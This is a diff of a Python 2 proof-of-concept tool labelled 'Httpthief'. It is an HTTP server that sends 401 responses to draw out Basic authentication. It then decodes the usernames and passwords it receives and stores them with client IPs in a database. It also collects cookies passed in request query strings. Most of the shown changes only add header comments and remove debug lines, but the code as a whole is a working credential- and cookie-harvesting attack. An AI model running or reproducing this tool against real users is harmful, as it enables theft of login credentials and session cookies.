@@ -1,4 +1,10 @@
-from os import curdir, sep
+#!/usr/bin/env python2
+#
+# Httpthief PoC.
+# author: Slawomir Rozbicki (httpthief@rozbicki.eu)
+# GPL v3. 
+# !!Change dir to directory with bitmap!!
+
 from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 from sqlstore import DB
 from base64 import b64decode
@@ -15,16 +21,15 @@ class MyHandler(BaseHTTPRequestHandler):
             if clientheaders[i][:13] == "Authorization":
                 authheadindex = i
         if authheadindex:
-            #self.log_message(clientheaders[authheadindex])
             cred_b64 = str(clientheaders[authheadindex].split(' ')[-1:])
-            try:
+            try: #TODO: investigate why this happens with short strings.
                 cred = b64decode(cred_b64)
             except TypeError:
                 cred = "unabletodecodeb64:" + cred_b64
             username, password = cred.split(":")
             store.insert_cred(clientip, username, password)
             self.send_response(200)
-            self.send_header('Content-type', 'image/bmp') #TODO: send 1x1px Image blob
+            self.send_header('Content-type', 'image/bmp')
             self.end_headers()
             bitmap_dump = open('bg.bmp', 'r').readlines()
             self.wfile.write(bitmap_dump[0])
@@ -32,7 +37,6 @@ class MyHandler(BaseHTTPRequestHandler):
             qmindex = self.path.find('?')+1
             if qmindex:
                 cookies = self.path[qmindex:]
-                #self.log_message(cookies)
                 store.insert_cookie(clientip, cookies)
             self.send_response(401)
             self.log_message('sending 401 to: ' + clientip)
